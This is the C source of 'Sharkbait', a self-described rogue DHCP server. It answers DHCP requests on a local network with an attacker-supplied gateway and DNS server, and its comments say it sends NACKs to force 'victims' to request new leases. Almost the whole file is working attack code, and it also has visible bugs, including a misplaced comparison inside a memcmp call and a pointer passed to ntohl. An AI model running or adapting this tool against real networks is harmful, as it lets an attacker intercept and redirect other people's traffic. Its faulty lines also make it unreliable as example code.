#ifdef __INTELLISENSE__
#pragma diag_suppress 70
#endif

#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <getopt.h>
#include <signal.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <errno.h>

#include "../common/net.h"
#include "../common/dhcp.h"

#define BUFFER_SIZE 65535

typedef struct Packet
{
    DHCP dhcp;
} __attribute__((packed)) Packet;

int get_iface_ip(int sock, const char *interface, uint32_t *ip, char *ipout);
int calc_base_ip(uint32_t *ip_addr, uint32_t *netmask, uint32_t *base_ip_out, char *ip_str_out);
int get_iface_netmask(int sock, const char *interface, uint32_t *netmask, char *netmask_out);
int get_number_of_ips(uint32_t base_ip);
int parse_dhcp_options(Packet *p);
Packet *init_packet(Packet *client_request, uint32_t lease_ip);
void print_usage(const char *progname);
void stop(int sig);
int get_if_gw(char *interface, char *gw_str, size_t gw_str_len);


volatile sig_atomic_t keep_running = 1;
uint32_t start_lease;
uint32_t base_ip;
uint32_t netmask;
uint32_t ip;
uint32_t recent_xid;
uint32_t gw;
struct in_addr gateway_ip, nameserver_ip;


int main(int argc, char *argv[])
{
    printf("Sharkbait - Rogue DHCP Server\n\n");

    if(getuid() != 0)
    {
        fprintf(stderr, "Error: Sharkbait requires root privileges\n");
        fprintf(stderr, "Try: sudo %s -i <interface> -g <gateway> -n <nameserver>\n", argv[0]);
        return 1;
    }

    signal(SIGINT, stop);

    char *nameserver = NULL;
    char *gateway = NULL;
    char *interface = NULL;
    int opt;

    while((opt = getopt(argc, argv, "g:n:i:h")) != -1)
    {
        switch(opt)
        {
            case 'h':
                print_usage(argv[0]);
                return 0;
            case 'i':
                interface = optarg;
                break;
            case 'n':
                nameserver = optarg;
                break;
            case 'g':
                gateway = optarg;
                break;
        }
    }

    if(!interface)
    {
        fprintf(stderr, "Error: -i <interface> is required.\n\n");
        print_usage(argv[0]);
        return 1;
    }

    if(!nameserver || !gateway)
    {
        fprintf(stderr, "Error: Need both flags [-g/-n]\n\n");
        print_usage(argv[0]);
        return 1;
    }

    inet_pton(AF_INET, gateway, &gateway_ip);
    inet_pton(AF_INET, nameserver, &nameserver_ip);

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(67);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    int enable_broadcast = 1;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if(sock < 0)
    {
        perror("socket SOCK_DGRAM");
        return 1;
    }
    
    if(setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &enable_broadcast, sizeof(enable_broadcast)) < 0)
    {
        perror("setsockopt SO_BROADCAST");
        close(sock);
        return 1;
    }

    char iface_ip_str[INET_ADDRSTRLEN];
    char iface_netmask_str[INET_ADDRSTRLEN];
    char iface_base_ip[INET_ADDRSTRLEN];
    char default_gw[INET_ADDRSTRLEN];


    if(get_iface_ip(sock, interface, &ip, iface_ip_str) != 0)
    {
        fprintf(stderr, "Error: Could not get IP address for interface %s\n", interface);
        return 1;
    }

    if(get_iface_netmask(sock, interface, &netmask, iface_netmask_str) != 0)
    {
        fprintf(stderr, "Error: Could not get netmask for interface %s\n", interface);
        return 1;
    }
    if(get_if_gw(interface, default_gw, sizeof(default_gw)) != 0)
    {
        fprintf(stderr, "Error: Could not get default gw for interface %s\n", interface);
        return 1;
    }

    if(inet_pton(AF_INET, default_gw, &gw) != 1)
    {
        perror("inet_pton");
        return 1;
    }

    calc_base_ip(&ip, &netmask, &base_ip, iface_base_ip);

    int n = get_number_of_ips(netmask);

    inet_ntop(AF_INET, &base_ip, iface_base_ip, INET_ADDRSTRLEN);
    memcpy(&start_lease, &base_ip, sizeof(uint32_t));
    start_lease = ntohl(start_lease);
    start_lease = start_lease + 1;

    int result = bind(sock, (struct sockaddr *)&addr, sizeof(addr));

    if(result == -1)
    {
        perror("socket bind");
        return 1;
    }

    printf("Listening on interface: %s\n", interface);
    printf("Pool size: %d\n\n", n);
    printf("Press Ctrl+C to stop listening.\n\n");

    char buffer[BUFFER_SIZE];

    struct sockaddr_in client;
    socklen_t len = sizeof(client);

    int lease_index = 0;

    struct timeval tv = {.tv_sec =1, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    gw = ntohl(gw);
    uint32_t _ip = ntohl(&ip);

    while(keep_running)
    {   
        
        if(memcmp(&start_lease, &gw, sizeof(uint32_t)) == 0 || memcmp(&start_lease, &_ip, sizeof(uint32_t) == 0)
        {
            printf("Skipping gw ip\n");
            start_lease += 1;
        }

        int bytes_recv = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&client, &len);
        if(bytes_recv < 0)
        {
            if(errno == EINTR)
            {
                continue;
            }
        }

        if(bytes_recv < (int)(offsetof(Packet, dhcp.transaction_id) + 4))
        {
            continue;
        }

        Packet *p = (Packet *)buffer;

        if(p->dhcp.opcode != 0x01)
        {
            continue;
        }

        uint32_t xid;
        memcpy(&xid, &p->dhcp.transaction_id, 4);
        xid = ntohl(xid);
        if((xid >> 16) == MAGIC_TAG)
        {
            printf("Received a packet likely from Poolshark, discarding.\n");
            continue;
        }

        printf("Client (xid: %02x%02x%02x%02x) [%02X:%02X:%02X:%02X:%02X:%02X] requested an IP address.\n",
            p->dhcp.transaction_id[0],
            p->dhcp.transaction_id[1],
            p->dhcp.transaction_id[2],
            p->dhcp.transaction_id[3],
            p->dhcp.client_mac[0], 
            p->dhcp.client_mac[1], 
            p->dhcp.client_mac[2], 
            p->dhcp.client_mac[3], 
            p->dhcp.client_mac[4], 
            p->dhcp.client_mac[5]
        );

        Packet *response = NULL;

        int msg_type = parse_dhcp_options(p);

        if(msg_type == -1)
        {
            continue;
        }

        client.sin_addr.s_addr = htonl(INADDR_BROADCAST);
        client.sin_port = htons(68);

        if(msg_type == 1)
        {
            printf("Message type: DHCPDISCOVER\n");

            response = init_packet(p, htonl(start_lease));
            memcpy(&recent_xid, &response->dhcp.transaction_id, 4);

            int offset = 0;
            uint32_t lease_time = htonl(86400);

            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){2});
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SERVER_ID, 4, &ip);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SUBNET_MASK, 4, &netmask);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_ROUTER, 4, &gateway_ip.s_addr);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_LEASE_TIME, 4, &lease_time);
            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_DNS, 4, &nameserver_ip.s_addr);
            response->dhcp.options[offset++] = DHCP_OPTION_END;

        }
        else if(msg_type == 2)
        {

            if(memcmp(p->dhcp.transaction_id, &recent_xid, sizeof(recent_xid)) != 0 && lease_index == 0)
            {
                // Send NACK for any DHCPREQUEST
                // This will force victims to send a DHCPDISCOVER

                printf("Message type: DHCPREQUEST\n");
                printf("Sending NACK\n");

                // Init base DHCP struct
                response = init_packet(p, htonl(start_lease));

                // Add DHCP options for a NACK
                int offset = 0;
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){DHCP_NAK});
                response->dhcp.options[offset++] = DHCP_OPTION_END;
            }
            else
            {
                printf("Message type: DHCPREQUEST\n");
                printf("Sending ACK\n");


                response = init_packet(p, htonl(start_lease));
                start_lease = start_lease + 1;

                int offset = 0;
                uint32_t lease_time = htonl(86400);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){5});
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_LEASE_TIME, 4, &lease_time);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SUBNET_MASK, 4, &netmask);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_ROUTER, 4, &gateway_ip.s_addr);
                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_DNS, 4, &nameserver_ip.s_addr);
                response->dhcp.options[offset++] = DHCP_OPTION_END;
            }
        }
        else
        {
            continue;
        }

        int sent_bytes = sendto(sock, response, sizeof(*response), 0, (struct sockaddr *)&client, len);

        if(sent_bytes < 0)
        {
            perror("sendto");
            free(response);
            return 1;
        }

        free(response);

        printf("Sent %d bytes to [%02X:%02X:%02X:%02X:%02X:%02X]\n\n", 
            sent_bytes,
            p->dhcp.client_mac[0],
            p->dhcp.client_mac[1],
            p->dhcp.client_mac[2],
            p->dhcp.client_mac[3],
            p->dhcp.client_mac[4],
            p->dhcp.client_mac[5]

        );

    }

    printf("\n\nCleaning up...");
    close(sock);
    printf(" [OK]\n");

    return 0;
}

void stop(int sig)
{
    keep_running = 0;
}

int get_iface_ip(int sock, const char *interface, uint32_t *ip, char *ipout)
{
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if(ioctl(sock, SIOCGIFADDR, &ifr) < 0)
    {
        return -1;
    }

    struct sockaddr_in *sa = (struct sockaddr_in *)&ifr.ifr_addr;
    inet_ntop(AF_INET, &sa->sin_addr, ipout, INET_ADDRSTRLEN);
    memcpy(ip, &sa->sin_addr, sizeof(sa->sin_addr));

    return 0;
}


int calc_base_ip(uint32_t *ip_addr, uint32_t *netmask, uint32_t *base_ip_out, char *ip_str_out)
{
    uint32_t base = *ip_addr & *netmask;
    *base_ip_out = base;
    inet_ntop(AF_INET, &base, ip_str_out, INET_ADDRSTRLEN);
    return 0;

}

int get_iface_netmask(int sock, const char *interface, uint32_t *netmask, char *netmask_out)
{
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if(ioctl(sock, SIOCGIFNETMASK, &ifr) < 0)
    {
        return -1;
    }

    struct sockaddr_in *sa = (struct sockaddr_in *)&ifr.ifr_netmask;
    inet_ntop(AF_INET, &sa->sin_addr.s_addr, netmask_out, INET_ADDRSTRLEN);
    memcpy(netmask, &sa->sin_addr.s_addr, sizeof(sa->sin_addr));

    return 0;
}

int get_number_of_ips(uint32_t netmask)
{
    int cidr = cidr_from_netmask(netmask);
    int n = (1 << (32 - cidr)) - 2;

    return n;
}

int parse_dhcp_options(Packet *p)
{
    int len = sizeof(p->dhcp.options);
    int i = 0;

    if(len <= 0)
    {
        fprintf(stderr, "Error: DHCP options should not be NULL.\n");
        return -1;
    }

    while(i < len)
    {
        if(p->dhcp.options[i] == DHCP_OPTION_END)
        {
            return -1;
        }

        if(p->dhcp.options[i] == DHCP_OPTION_REQUESTED_IP)
        {
            uint32_t requested_ip = p->dhcp.options[i + 2];
            return 1;
        }

        if(p->dhcp.options[i] == DHCP_OPTION_MESSAGE_TYPE)
        {
            int msg = p->dhcp.options[i + 2];

            switch(msg)
            {
                case 0x01:
                    return 1;
                case 0x03:
                    return 2;
            }
        }
        i += 2 + p->dhcp.options[i + 1];
    }
    return -1;
}


Packet *init_packet(Packet *client_request, uint32_t lease_ip)
{
    // Allocate the packet in memory
    Packet *p = malloc(sizeof(Packet));
    if(!p)
    {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    // Zero out Packet struct
    memset(p, 0, sizeof(Packet));

    memcpy(p->dhcp.ip_addr, &lease_ip, sizeof(p->dhcp.ip_addr));

    // Build the basic DHCP structure
    p->dhcp.opcode = 0x02;
    p->dhcp.hw_type = 0x01;
    p->dhcp.hw_len = 0x06;
    memcpy(p->dhcp.transaction_id, &client_request->dhcp.transaction_id, sizeof(p->dhcp.transaction_id));
    memcpy(p->dhcp.flags, &client_request->dhcp.flags, sizeof(p->dhcp.flags));
    memcpy(p->dhcp.ip_addr, &lease_ip, sizeof(p->dhcp.ip_addr));
    memcpy(p->dhcp.client_mac, &client_request->dhcp.client_mac, sizeof(p->dhcp.client_mac));
    memcpy(&recent_xid, &client_request->dhcp.transaction_id, 4);
    set_dhcp_magic_cookie(p->dhcp.magic_cookie);

    return p;
}

int get_if_gw(char *interface, char *gw_str, size_t gw_str_len)
{
    char line[256];
    char iface[IFNAMSIZ];
    int flags, refcnt, use, metric, mtu, window, irtt;
    unsigned long dest, gateway;
    unsigned long mask;

    const char *filename = "/proc/net/route";
    FILE *fp = fopen(filename, "r");

    if(!fp)
    {
        fprintf(stderr, "Error: Could not open %s\n", filename);
        return -1;
    }

    if(!fgets(line, sizeof(line), fp))
    {
        fprintf(stderr, "Could not read from %s\n", filename);
        fclose(fp);
        return -1;
    }

    while(fgets(line, sizeof(line), fp))
    {
        int ret = sscanf(line, "%15s %lx %lx %X %d %d %d %lx %d %d %d",
                          iface, &dest, &gateway, &flags, &refcnt, &use,
                          &metric, &mask, &mtu, &window, &irtt);

        if(ret != 11)
        {
            continue;
        }

        if(dest != 0)
        {
            continue;
        }

        if(strcmp(iface, interface) != 0)
        {
            continue;
        }

        struct in_addr addr;
        addr.s_addr = gateway;
        inet_ntop(AF_INET, &addr, gw_str, gw_str_len);
        fclose(fp);
        return 0;
    }
    fclose(fp);
    return -1;
}

void print_usage(const char *progname)
{
    printf("Sharkbait - Rogue DHCP Server\n\n");
    printf("Usage: sudo %s -i <interface> -g <gateway> -n <nameserver> [-h]\n", progname);
    printf("\n");
    printf("Required:\n");
    printf("  -i <interface>  Network interface to listen on (e.g., eth0, wlan0)\n");
    printf("  -g <gateway>    Gateway IP to hand out to clients\n");
    printf("  -n <nameserver> DNS server IP to hand out to clients\n");
    printf("\n");
    printf("Options:\n");
    printf("  -h              Display this help message\n");
    printf("Examples:\n");
    printf("  sudo %s -i eth0 -g 192.168.1.1 -n 8.8.8.8\n", progname);
    printf("\n");
    printf("Press Ctrl+C to stop listening.\n");
}